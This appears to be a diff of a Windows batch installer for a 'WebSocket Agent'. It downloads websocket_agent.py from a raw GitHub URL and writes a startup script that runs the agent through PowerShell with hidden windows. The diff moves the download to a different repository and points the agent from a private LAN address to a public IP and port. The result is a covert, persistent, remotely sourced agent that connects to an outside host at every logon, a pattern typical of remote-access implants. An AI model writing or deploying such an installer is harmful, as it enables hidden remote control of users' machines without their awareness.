@@ -4,7 +4,7 @@ echo Installing WebSocket Agent as Windows Startup Service...
 REM Check if Python script exists, if not download it
 if not exist "websocket_agent.py" (
     echo Downloading websocket_agent.py...
-    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py' -OutFile 'websocket_agent.py'"
+    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Swanstonn/temp/main/websocket_agent.py' -OutFile 'websocket_agent.py'"
 )
 
 REM Install websockets package
@@ -17,7 +17,7 @@ echo Creating startup script...
 echo @echo off
 echo REM WebSocket Agent Startup Script
 echo cd /d "%~dp0"
-echo powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '192.168.129.23', '8888', 'test' -WindowStyle Hidden"
+echo powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden"
 ) > start_agent_startup.bat
 
 echo Created startup script: start_agent_startup.bat
